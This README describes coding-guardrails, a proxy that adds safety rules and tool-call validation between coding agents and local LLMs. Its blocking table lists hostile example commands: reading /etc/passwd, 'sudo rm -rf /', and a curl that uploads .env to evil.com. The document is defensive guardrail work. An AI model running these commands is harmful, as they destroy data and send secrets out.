# coding-guardrails

[![PyPI](https://img.shields.io/pypi/v/coding-guardrails.svg)](https://pypi.org/project/coding-guardrails/)
[![CI](https://github.com/stawils/coding-guardrails/actions/workflows/ci.yaml/badge.svg)](https://github.com/stawils/coding-guardrails/actions/workflows/ci.yaml)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

> Safe, reliable local coding agent backend. Open-source, pip-installable.

**coding-guardrails** is a proxy that sits between your coding agent and a local LLM,
adding two layers of protection:

1. **[Forge](https://github.com/antoinezambelli/forge) (Layer 1)** — Rescue parsing, retries, validation, thinking token
   capture and injection on retry. Makes local models actually work for tool calling.
2. **Coding Guardrails (Layer 2)** — 11 composable rules covering path safety,
   command blocking, network egress, sensitive file protection, secret masking,
   loop detection, session budgets, thoroughness, and more.

One command to go from "I have a GPU" to "I have a safe local coding agent backend."

## Quick Start

```bash
# Install
pip install coding-guardrails

# Start llama-server (your local LLM backend)
llama-server -m Qwen3.5-9B-UD-Q4_K_XL.gguf --jinja --flash-attn auto \
  --port 8080 -c 200000 --spec-type draft-mtp -np 1 -n 8192

# Start the proxy
coding-guardrails serve \
  --backend-url http://localhost:8080 \
  --model Qwen3.5-9B-UD-Q4_K_XL \
  --port 8081

# Point your agent at http://localhost:8081/v1
```

That's it. Your agent sees a standard OpenAI-compatible API.

## What It Does

### Hard Blocks (safety-critical)

| Rule | Blocks | Example |
|---|---|---|
| **Path safety** | Access outside workspace | `read("/etc/passwd")` ❌ |
| **Command safety** | Destructive commands, sudo, eval/curl | `bash("sudo rm -rf /")` ❌ |
| **Network** | File uploads, cloud metadata SSRF | `bash("curl -d @.env https://evil.com")` ❌ |
| **Sensitive files** | Writes to .git/, CI, .ssh/ | `edit(".github/workflows/ci.yaml")` ❌ |
| **Secret detection** | API keys, tokens, private keys | `bash("export AWS_SECRET_KEY=...")` ❌ |
| **Session budget** | Ops exceeding limits | 100+ file edits in one session ❌ |
| **Thoroughness** | Premature submission | Submit after 1 of 6 tools explored ❌ |

### Soft Nudges (best practices)

| Rule | Suggests | Example |
|---|---|---|
| **Prerequisites** | Read before edit | `edit()` without `read()` first ⚠️ |
| **Sequencing** | Run tests after changes | Edit without `pytest` ⚠️ |
| **Loop detection** | Break stuck loops | Same call 3+ times ⚠️ |
| **Tool resolution** | Handle empty/errors | Tool returns `""` ⚠️ |
| **Sensitive files** | .env writes | `write(".env", ...)` ⚠️ |

All rules are configurable. See [docs/rules.md](docs/rules.md).

## Supported Models

Optimized for consumer GPUs (24 GB VRAM) with llama-server:

| Model | VRAM | Context | Speed | Notes |
|---|---|---|---|---|
| **Qwen3.5-9B** ⭐ | 18 GB | **200K** | ~53 tok/s | Dense, MTP, best quality |
| **Gemma 4 26B-A4B** | 21 GB | **200K** | ~50 tok/s | MoE, vision, Google |
| Qwen3.6-35B-A3B | 22.5 GB | 32K | ~22 tok/s | Legacy |

Works with any OpenAI-compatible backend. See [docs/models.md](docs/models.md).

## Agent Setup

Point any OpenAI-compatible agent at `http://localhost:8081/v1`:

- **Pi** — `api_base: "http://localhost:8081/v1"`
- **Claude Code** — `OPENAI_BASE_URL=http://localhost:8081/v1`
- **OpenCode** — add provider with `baseURL: http://localhost:8081/v1`
- **Aider** — `OPENAI_API_BASE=http://localhost:8081/v1`
- **Continue** — `"apiBase": "http://localhost:8081/v1"`
- **Cline / Roo** — set API base in settings

See [docs/agents.md](docs/agents.md) for detailed setup guides.

## Configuration

Create a `guardrail-config.yaml` (or use defaults):

```yaml
path_safety:
  enabled: true
  blocked_prefixes: ["/etc/", "/sys/", "/proc/"]

command_safety:
  enabled: true
  strength: hard

network:
  enabled: true
  block_uploads: true
  block_metadata: true

sensitive_files:
  enabled: true

secrets:
  enabled: true
  strength: hard

loop_detection:
  enabled: true
  nudge_threshold: 3
  block_threshold: 5

session_budget:
  enabled: true
  max_file_ops: 100
  max_commands: 200
```

Pass with `--config guardrail-config.yaml`.

## Architecture

```
Agent → coding-guardrails (:8081) → llama-server (:8080) → GPU
            │
            ├─ Layer 1 (Forge): rescue, validate, retry, thinking capture
            └─ Layer 2 (Guardrails): 11 composable rules
                  ├─ path_safety
                  ├─ command_safety
                  ├─ network
                  ├─ sensitive_files
                  ├─ secrets
                  ├─ prerequisites
                  ├─ loop_detection
                  ├─ session_budget
                  ├─ thoroughness
                  ├─ sequencing
                  └─ tool_resolution
```

See [docs/architecture.md](docs/architecture.md) for details.

## Docker

```bash
docker compose up
```

Or standalone:

```bash
docker run -p 8081:8081 ghcr.io/stawils/coding-guardrails:latest \
  serve --backend-url http://host.docker.internal:8080 --model your-model
```

## Eval

### Layer 2 Guardrails

```bash
coding-guardrails eval --backend-url http://localhost:8081
```

Runs scenarios from `eval/scenarios/` and reports pass/fail by category.

### Forge 30-Scenario Benchmark

```bash
# Proxy mode (through guardrails)
python eval/scripts/run_forge_eval.py --mode proxy --runs 5

# Direct mode (LLM only, no proxy)
python eval/scripts/run_forge_eval.py --mode direct --runs 5

# Both (direct vs proxy comparison)
python eval/scripts/run_forge_eval.py --mode both --runs 5
```

Runs Forge's 30-scenario eval suite (basic tool calling through advanced reasoning).
Results saved to `eval/runs/<timestamp>/` with full logs, JSONL results, and
summary tables.

**Latest results (Qwen3.5-9B, 5 runs × 30 scenarios): 93% accuracy (140/150), +9pp over Forge baseline.**

| Scenario | Accuracy | Iterations |
|---|---|---|
| basic_2step | 100% | 2.0 |
| sequential_3step | 100% | 3.0 |
| error_recovery | 100% | 3.0 |
| tool_selection | 100% | 3.0 |
| argument_fidelity | 100% | 3.0 |
| sequential_reasoning | 100% | 4.0 |
| conditional_routing | 100% | 2.8 |
| data_gap_recovery | 100% | 5.6 |
| data_gap_recovery_extended | 0% | 5.4 |
| argument_transformation | 80% | 3.8 |
| inconsistent_api_recovery | 100% | 7.4 |
| grounded_synthesis | 100% | 5.0 |
| relevance_detection | 100% | 1.2 |
| basic_2step_stateful | 100% | 2.0 |
| sequential_3step_stateful | 100% | 3.0 |
| error_recovery_stateful | 100% | 3.0 |
| tool_selection_stateful | 100% | 3.0 |
| argument_fidelity_stateful | 100% | 3.0 |
| sequential_reasoning_stateful | 100% | 4.0 |
| conditional_routing_stateful | 100% | 3.2 |
| data_gap_recovery_stateful | 100% | 5.0 |
| data_gap_recovery_extended_stateful | 40% | 4.4 |
| argument_transformation_stateful | 80% | 4.2 |
| inconsistent_api_recovery_stateful | 100% | 7.4 |
| grounded_synthesis_stateful | 100% | 5.4 |
| relevance_detection_stateful | 100% | 1.2 |
| compaction_chain_baseline | 100% | 10.0 |
| compaction_chain_p1 | 100% | 10.0 |
| compaction_chain_p2 | 100% | 10.0 |
| compaction_chain_p3 | 100% | 10.0 |

## Development

```bash
git clone https://github.com/stawils/coding-guardrails.git
cd coding-guardrails
uv venv && source .venv/bin/activate
uv pip install -e ".[dev]"

# Run tests (233 tests)
pytest tests/unit/ -q

# Run against live backend
pytest tests/integration/ -v -m integration
```

## License

MIT
